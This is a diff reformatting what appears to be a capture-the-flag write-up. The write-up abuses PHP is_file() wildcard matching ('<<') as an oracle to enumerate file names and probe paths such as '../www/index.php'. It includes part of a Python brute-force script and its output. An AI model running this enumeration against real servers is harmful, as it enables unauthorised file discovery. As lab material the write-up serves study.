@@ -13,36 +13,16 @@
 6
 7
 8
-```
-
-
-
-```
-is_file('a<<') => false 
-is_file('b<<') => false 
+is_file('a<<') => false
+is_file('b<<') => false
 ...
-is_file('i<<') => true 
-is_file('in<<') => true 
-is_file('inde<<') => true 
+is_file('i<<') => true
+is_file('in<<') => true
+is_file('inde<<') => true
 ...
 is_file('index.php') => true
-```
-
-
-
-```
 1
-```
-
-
-
-```
 is_file('../www/index.php') => true
-```
-
-
-
-```
 1
  2
  3
@@ -61,13 +41,8 @@ is_file('../www/index.php') => true
 16
 17
 18
-```
-
-
-
-```
 from requests import post
-from string import ascii_lowercase, digits 
+from string import ascii_lowercase, digits
 
 def find(prefix):
  for c in ascii_lowercase + digits:
@@ -83,11 +58,6 @@ def find(prefix):
  find(search)
 
 find(prefix="")
-```
-
-
-
-```
 1
  2
  3
@@ -102,11 +72,6 @@ find(prefix="")
 12
 13
 14
-```
-
-
-
-```
 $ python3 solve.py
 found: qr
 found: qrs
